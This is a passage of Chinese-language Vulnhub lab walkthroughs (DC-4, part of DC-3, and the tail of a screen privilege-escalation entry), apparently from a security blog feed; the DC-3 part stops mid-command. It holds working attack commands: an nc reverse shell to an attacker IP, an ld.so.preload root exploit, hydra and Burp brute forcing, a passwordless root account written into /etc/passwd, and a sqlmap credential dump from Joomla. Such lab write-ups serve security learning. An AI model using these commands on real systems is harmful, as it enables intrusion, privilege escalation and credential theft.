class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared -ldl -o libhax.so libhax.c</span><br><span class="line">gcc -o rootshell rootshell.c</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1238.png" alt="图片"></p><p>编译完后我用 <code>nc</code> 把刚刚编译好的文件传到目标服务器上：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">KALI：</span><br><span class="line">nc -nlvp 7777 &lt; libhax.so</span><br><span class="line">nc -nlvp 7777 &lt; rootshell</span><br><span class="line"></span><br><span class="line">靶机：</span><br><span class="line">nc 192.168.1.128 7777 &gt; libhax.so</span><br><span class="line">nc 192.168.1.128 7777 &gt; rootshell</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1239.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1240.png" alt="图片"></p><p>最后按照 <code>POC</code> 上面的步骤依次输入命令提权为 <code>root</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1241.png" alt="图片"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">umask</span> 000 </span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1242.png" alt="图片"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">screen -D -m -L ld.so.preload <span class="built_in">echo</span> -ne  <span class="string">&quot;\x0a/tmp/libhax.so&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1243.png" alt="图片"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">screen -ls</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1244.png" alt="图片"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/tmp/rootshell</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1245.png" alt="图片"></p><p>最终也是在 <code>/root</code> 目录下拿到了 <code>Flag</code>：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1246.png" alt="图片"></p><h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p><strong>若有好的建议和合作可以通过公众号与我联系！</strong><br>微信公众号：<code>渗透攻击红队</code><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/logo/vxgzh.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> Vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 权限提升 </tag>
            
            <tag> CTF </tag>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulnHub通关日记-DC_4-Walkthrough</title>
      <link href="/2020/02/29/Vulnhub-DC-4/"/>
      <url>/2020/02/29/Vulnhub-DC-4/</url>
      
        <content type="html"><![CDATA[<h2 id="靶机介绍"><a href="#靶机介绍" class="headerlink" title="靶机介绍"></a>靶机介绍</h2><p>DC-4 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.</p><p>Unlike the previous DC releases, this one is designed primarily for beginners/intermediates. There is only one flag, but technically, multiple entry points and just like last time, no clues</p><p>靶机地址：<a href="https://www.vulnhub.com/entry/dc-4,313/">https://www.vulnhub.com/entry/dc-4,313/</a></p><p>这边靶机和前一个是一样的，只需要获取一个<code>Flag</code>就行了，在 <code>/root</code> 目录下!</p><h2 id="学习到的知识"><a href="#学习到的知识" class="headerlink" title="学习到的知识"></a>学习到的知识</h2><p><code>Burpsuite</code>枚举弱口令<br><code>命令执行</code>反弹shell<br><code>hydra</code>爆破<code>ssh</code><br><code>teehee</code>权限提升</p><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>拿到 <code>IP</code> 先对它进行端口扫描：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -T4 192.168.1.100</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1206.png" alt="图片"></p><p>这边扫描出来靶机开放了 <code>22</code>（ssh）、<code>80</code>（http）端口，先从 <code>80</code> 端口来入侵：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1207.png" alt="图片"></p><h2 id="Burpsuite枚举弱口令"><a href="#Burpsuite枚举弱口令" class="headerlink" title="Burpsuite枚举弱口令"></a>Burpsuite枚举弱口令</h2><p>打开后发现是一个登陆的页面，我尝试了常规的弱口令 <code>admin</code>、<code>admin123</code> 无果，随后我又尝试了一遍 <code>SQL</code> 注入，并没有注入点！这个时候就需要掏出我的字典来了来配合 <code>Burp</code> 爆破：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /login.php HTTP/1.1</span><br><span class="line">Host: 192.168.1.100</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://192.168.1.100/</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 30</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: PHPSESSID=lddqa4ven9a9qqf8ua9tlurj35</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">username=admin&amp;password=§123456§</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1208.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1209.png" alt="图片"></p><p>爆破成功后得到密码 <code>happy</code>，随后拿着账号和密码登陆到了后台，在后台发现可以执行查看文件的操作：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1210.png" alt="图片"></p><h2 id="命令执行反弹shell"><a href="#命令执行反弹shell" class="headerlink" title="命令执行反弹shell"></a>命令执行反弹shell</h2><p>这个时候想到了<code>命令执行</code>，<code>whoami</code> 看了看权限是一个网站普通权限：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1211.png" alt="图片"></p><p>我们先用 <code>nc</code> 反弹一个 <code>shell</code> 回来把，<code>kali</code> 监听 <code>4444</code> 端口，在 <code>radio</code> 变量输入 <code>nc</code> 反弹的地址成功反弹一枚shell：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh 192.168.1.128 4444</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1212.png" alt="图片"></p><p>我们先让它得到一个 <code>bash</code> 把：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><h2 id="hydra爆破ssh"><a href="#hydra爆破ssh" class="headerlink" title="hydra爆破ssh"></a>hydra爆破ssh</h2><p>之后我是在 <code>/home/jim</code> 目录里发现了一个<code>历史密码</code>的<code>备份文件</code>：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1213.png" alt="图片"></p><p>既然得到了密码，那么就用<code>九头蛇</code>来爆破把：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l jim -P pass ssh://192.168.1.100 -t 10</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1214.png" alt="图片"></p><p>爆破成功后得到 <code>jim</code> 的密码为 <code>jibril04</code>，随后我登陆到了 <code>jim</code> 用户：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh jim@192.168.1.100</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1215.png" alt="图片"></p><p>登陆之后我习惯性的 <code>sudo -l</code> 发现需要密码：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1216.png" alt="图片"></p><p>紧接着我在 <code>jim</code> 的目录下发现了一个文件，文件里好像是一封邮件信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">From root@dc-4 Sat Apr 06 20:20:04 2019</span><br><span class="line">Return-path: &lt;root@dc-4&gt;</span><br><span class="line">Envelope-to: jim@dc-4</span><br><span class="line">Delivery-date: Sat, 06 Apr 2019 20:20:04 +1000</span><br><span class="line">Received: from root by dc-4 with local (Exim 4.89)</span><br><span class="line">        (envelope-from &lt;root@dc-4&gt;)</span><br><span class="line">        id 1hCiQe-0000gc-EC</span><br><span class="line">        for jim@dc-4; Sat, 06 Apr 2019 20:20:04 +1000</span><br><span class="line">To: jim@dc-4</span><br><span class="line">Subject: Test</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=&quot;UTF-8&quot;</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">Message-Id: &lt;E1hCiQe-0000gc-EC@dc-4&gt;</span><br><span class="line">From: root &lt;root@dc-4&gt;</span><br><span class="line">Date: Sat, 06 Apr 2019 20:20:04 +1000</span><br><span class="line">Status: RO</span><br><span class="line"></span><br><span class="line">This is a test.</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1217.png" alt="图片"></p><p>好像没得啥子用处！最后我在邮箱目录找到了另一封邮件：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1218.png" alt="图片"></p><p>读完这封邮件我得到了 <code>charles</code> 告诉 <code>jim</code> 的一个重要信息，也就是 <code>charles</code> 的密码！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">charles：^xHhA&amp;hvim0y</span><br></pre></td></tr></table></figure><p>获取到密码后我切换到了 <code>charles</code> 用户：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su charles</span><br><span class="line">^xHhA&amp;hvim0y</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1219.png" alt="图片"></p><h2 id="teehee权限提升"><a href="#teehee权限提升" class="headerlink" title="teehee权限提升"></a>teehee权限提升</h2><p>切换用户之后我又是习惯性的 <code>sudo -l</code> 发现 <code>charles</code> 用户可以以 <code>root</code> 身份去运行 <code>teehee</code>命令：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1220.png" alt="图片"></p><p>我紧接着写入了一个 <code>saul</code> 账号到 <code>passwd</code> 里：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;saul::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd</span><br><span class="line">#注释：</span><br><span class="line">#[用户名]：[密码]：[UID]：[GID]：[身份描述]：[主目录]：[登录shell]</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1221.png" alt="图片"></p><p>最后也是在 <code>/root</code> 目录下拿到了 <code>Flag</code> ～</p><h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p><strong>若有好的建议和合作可以通过公众号与我联系！</strong><br>微信公众号：<code>渗透攻击红队</code><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/logo/vxgzh.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> Vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 权限提升 </tag>
            
            <tag> CTF </tag>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulnHub通关日记-DC_3-Walkthrough</title>
      <link href="/2020/02/27/Vulnhub-DC-3/"/>
      <url>/2020/02/27/Vulnhub-DC-3/</url>
      
        <content type="html"><![CDATA[<h2 id="靶机简介"><a href="#靶机简介" class="headerlink" title="靶机简介"></a>靶机简介</h2><p>大家好，我是 <code>saulGoodman</code>，这篇文章是DC系列第三篇Walkthrough，总共有8篇，敬请期待！<br>下载地址：<a href="https://www.vulnhub.com/entry/dc-3,312/">https://www.vulnhub.com/entry/dc-3,312/</a><br>这次靶机只有一个 <code>Flag</code>，也就是在 <code>/root</code> 目录下的！所以我们要提升为 <code>root</code> 权限！</p><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>拿到靶机后的第一件事就是对它进行端口扫描：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p- -T4 192.168.1.103</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1191.png" alt="图片"></p><p>这边用 <code>NMAP</code> 扫描出来后发现它只开放了一个 <code>80</code> 端口，而且使用的 <code>CMS</code> 是 <code>Joomla</code>，这个 <code>CMS</code> 我之前完红日靶场遇到过一次。</p><p>既然 <code>CMS</code> 是 <code>Joomla</code> 那么就使用它的扫描工具对它一顿梭哈吧：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl joomscan.pl -u http://192.168.1.103 </span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1192.png" alt="图片"></p><p>扫描出来后我们得到了两个关键信息，也就是它的版本和它的网站后台地址：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">版本：Joomla 3.7.0</span><br><span class="line">后台地址 : http://192.168.1.103/administrator/</span><br></pre></td></tr></table></figure><p>先访问它的首页发现了一段提示信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Welcome to DC-3.</span><br><span class="line"></span><br><span class="line">This time, there is only one flag, one entry point and no clues.</span><br><span class="line"></span><br><span class="line">To get the flag, you&#x27;ll obviously have to gain root privileges.</span><br><span class="line"></span><br><span class="line">How you get to be root is up to you - and, obviously, the system.</span><br><span class="line"></span><br><span class="line">Good luck - and I hope you enjoy this little challenge.  :-)</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1193.png" alt="图片"></p><p>大概的意思就是说这个靶场只有一个Flag，要让我们取得 root 权限！</p><h2 id="Joomla-SQL-注入"><a href="#Joomla-SQL-注入" class="headerlink" title="Joomla SQL 注入"></a>Joomla SQL 注入</h2><p>既然是这样那么我首先是搜索了有关于 <code>Joomla 3.7.0</code> 的漏洞信息，看看能不能捡个漏</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Joomla 3.7.0</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1194.png" alt="图片"></p><p>由上图可见，它这个版本有一个 <code>SQL</code> 注入！既然有注入那么就丢到 <code>Sqlmap</code> 一把梭：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.103/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1195.png" alt="图片"></p><p>这边是注入出来了<code>五</code>个数据库，但是 <code>Joomla CMS</code> 默认的数据库为 <code>joomladb</code>，所以我们就直接跑这个数据库下的表把：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u &quot;http://192.168.1.103/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; <span class="comment">--risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb --tables</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">01</span>:<span class="number">08</span>:<span class="number">45</span>] [INFO] fetching tables <span class="keyword">for</span> database: <span class="string">&#x27;joomladb&#x27;</span></span><br><span class="line">[<span class="number">01</span>:<span class="number">08</span>:<span class="number">45</span>] [INFO] used <span class="keyword">SQL</span> query <span class="keyword">returns</span> <span class="number">91</span> entries</span><br><span class="line">Database: joomladb</span><br><span class="line">[<span class="number">76</span> tables]</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------+</span></span><br><span class="line"><span class="operator">|</span> #__assets           <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__associations     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__banner_clients   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__banner_tracks    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__banners          <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__bsms_admin       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__bsms_books       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__bsms_comments    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__bsms_locations   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__bsms_mediafiles  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__bsms_message_typ <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__bsms_podcast     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__bsms_series      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__bsms_servers     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__bsms_studies     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__bsms_studytopics <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__bsms_teachers    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__bsms_templatecod <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__bsms_templates   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__bsms_timeset     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__bsms_topics      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__bsms_update      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__categories       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__contact_details  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__content_frontpag <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__content_rating   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__content_types    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__content          <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__contentitem_tag_ <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__core_log_searche <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__extensions       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__fields_categorie <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__fields_groups    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__fields_values    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__fields           <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__finder_filters   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__finder_links_ter <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__finder_links     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__finder_taxonomy_ <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__finder_taxonomy  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__finder_terms_com <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__finder_terms     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__finder_tokens_ag <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__finder_tokens    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__finder_types     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__jbsbackup_timese <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__jbspodcast_times <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__languages        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__menu_types       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__menu             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__messages_cfg     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__messages         <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__modules_menu     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__modules          <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__newsfeeds        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__overrider        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__postinstall_mess <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__redirect_links   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__schemas          <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__session          <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__tags             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__template_styles  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__ucm_base         <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__ucm_content      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__ucm_history      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__update_sites_ext <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__update_sites     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__updates          <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__user_keys        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__user_notes       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__user_profiles    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__user_usergroup_m <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__usergroups       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__users            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__utf8_conversion  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__viewlevels       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------+</span></span><br></pre></td></tr></table></figure><p>跑出来的表有 <code>91</code> 条！但是我们只需要它后台管理员的用户那个表就好，接着我找到了一个为<code>#__users</code>的表，随后我开始注入它的列：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u &quot;http://192.168.1.103/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; <span class="comment">--risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb -T &quot;#__users&quot; --columns</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Database: joomladb</span><br><span class="line"><span class="keyword">Table</span>: #__users</span><br><span class="line">[<span class="number">6</span> columns]</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">Column</span>   <span class="operator">|</span> Type        <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-------------+</span></span><br><span class="line"><span class="operator">|</span> email    <span class="operator">|</span> non<span class="operator">-</span><span class="type">numeric</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> id       <span class="operator">|</span> <span class="type">numeric</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> name     <span class="operator">|</span> non<span class="operator">-</span><span class="type">numeric</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> params   <span class="operator">|</span> non<span class="operator">-</span><span class="type">numeric</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> password <span class="operator">|</span> non<span class="operator">-</span><span class="type">numeric</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> username <span class="operator">|</span> non<span class="operator">-</span><span class="type">numeric</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-------------+</span></span><br></pre></td></tr></table></figure><p>最后注入出它的 <code>username</code> 和 <code>password</code> 列的数据：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u &quot;http://192.168.1.103/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; <span class="comment">--risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb -T &quot;#__users&quot; -C username,password --dump 